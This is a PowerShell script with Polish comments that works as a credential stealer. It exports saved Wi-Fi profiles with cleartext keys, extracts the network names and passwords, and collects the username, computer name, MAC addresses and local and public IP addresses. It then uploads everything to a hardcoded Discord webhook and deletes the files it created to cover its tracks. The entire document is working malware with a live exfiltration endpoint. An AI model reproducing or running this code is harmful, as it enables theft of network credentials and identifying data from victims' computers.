#Sprawdzanie polaczenia z internetem (jezeli nie ma, wylacza program)
if (!(Test-Connection -ComputerName www.google.com -Quiet -Count 1)) {
    exit
}

cd $env:USERPROFILE\Desktop
md passwords
cd passwords

# Wyeksportuj hasla
netsh wlan export profile key=clear

# Pobierz wszystkie pliki w bieżącym katalogu
$pliki = Get-ChildItem -Path . -File

#usuwanie linijek innych od 7 i 22, zapisywanie do nowego pliku ${plik}_nowy
foreach ($plik in $pliki) {

    $lines = Get-Content -Path $plik.FullName
    $selectedLines = $lines[6,21]
    $selectedLines | Out-File -FilePath "${plik}_nowy"
}

# Usun stare pliki
del *.xml


#Zmiana rozszerzen z *.xml_nowy na *.txt
$pliki = Get-ChildItem -Path . -Filter *.xml_nowy
foreach ($plik in $pliki) {
    Rename-Item -Path $plik.FullName -NewName ($plik.BaseName + ".txt")
}

# Zmiana pliku na czytelny

$pliki = Get-ChildItem -Path . -File
foreach ($plik in $pliki) {

    $content = Get-Content -Path $plik.FullName

    $line1 = "SSID: " + $content[0].Substring(9)
    $line1 = $line1 -replace "</name>", ""

    $line2 = " | Pass: " + $content[1].Substring(17)
    $line2 = $line2 -replace "</keyMaterial>", ""

    $line1 + $line2 | Out-File -FilePath $plik.FullName
}

# Tworzenie i zapisywanie hasel w pliku pass.wifi

New-Item -Path . -Name "pass.wifi" -ItemType "file" -Force
$pliki = Get-ChildItem -Path . -File

foreach ($plik in $pliki) {

    $content = Get-Content -Path $plik.FullName
    $content | Out-File -FilePath "pass.wifi" -Append
}

del *.txt

$date = Get-Date -Format "dd.MM.yyyyr."
$time = Get-Date -Format "HH_mm_ss"

$file_name = "Date ${date}  Time ${time}.txt"
$content = Get-Content -Path 'pass.wifi'

$mac = Get-NetAdapter | Select Name, MacAddress
$global_ip = Invoke-RestMethod -Uri 'http://ifconfig.me'

$local_ip = ipconfig #Get-NetIPAddress -AddressFamily IPV4
$local_ip = $local_ip[12..18]

$out_of_file = "Username: '$env:USERNAME' | Computername: '$env:COMPUTERNAME'", "`nMAC Adresses" + $mac, "`nGlobal IPv4: ${global_ip}", "Local IPv4:`n" + $local_ip, "`n`nSaved WIFI passwords:", $content

del pass.wifi
cd..
del passwords

$date = Get-Date -Format "dd.MM.yyyyr."
$time = Get-Date -Format "HH:mm:ss"
$content = "User / Computer Name: " + $env:COMPUTERNAME + " / " + $env:USERNAME + "     |  Date: " +  $date + "  |  Time: " + $time

$plik = New-Item -Path $file_name -ItemType File
Set-Content -Path $plik -Value $out_of_file

$file_directory = $plik.FullName






#################################      DISCORD





function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = 'https://discord.com/api/webhooks/1188761336654598245/nqBAa-TZ2MK3N6gXtGWtaoIsSzI7Oza8KzuCXhu7ESpas18wGqLPNRRYcCUXhZ0vMi71'

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe --ssl-no-revoke -F "file1=@$file" $hookurl}}

$name_of_message = $file_name + "USERNAME: $env:USERNAME  |  COMPUTERNAME: $env:COMPUTERNAME"


Upload-Discord -file $file_directory -text $name_of_message
del $file_directory ######
exit
   

